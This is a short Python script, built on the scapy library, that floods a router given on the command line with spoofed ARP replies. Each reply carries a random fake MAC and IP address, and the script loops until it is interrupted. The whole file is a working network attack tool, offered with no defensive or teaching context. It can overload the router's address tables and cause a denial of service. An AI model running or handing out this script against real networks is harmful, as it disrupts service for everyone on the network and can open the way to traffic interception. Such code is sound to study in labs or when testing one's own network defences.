from scapy.all import *
import sys

def mac_flood(router_ip, router_mac):
    bad_mac = ':'.join('%02x'%random.randint(0, 255) for x in range(6))
    bad_ip = '.'.join(str(random.randint(0, 255)) for x in range(4))
    packet = ARP(op = "is-at",
                hwsrc = bad_mac,
                psrc = bad_ip,
                pdst = router_ip,
                hwdst = router_mac)
    send(packet, verbose=False)

def main():
    router_ip = sys.argv[1]
    router_mac = getmacbyip(router_ip)

    try:
        print("Flooding router at {}".format(router_ip, router_mac))
        while True:
            mac_flood(router_ip, router_mac
            )
    except KeyboardInterrupt:
        print("\nEnding packet flood")

main()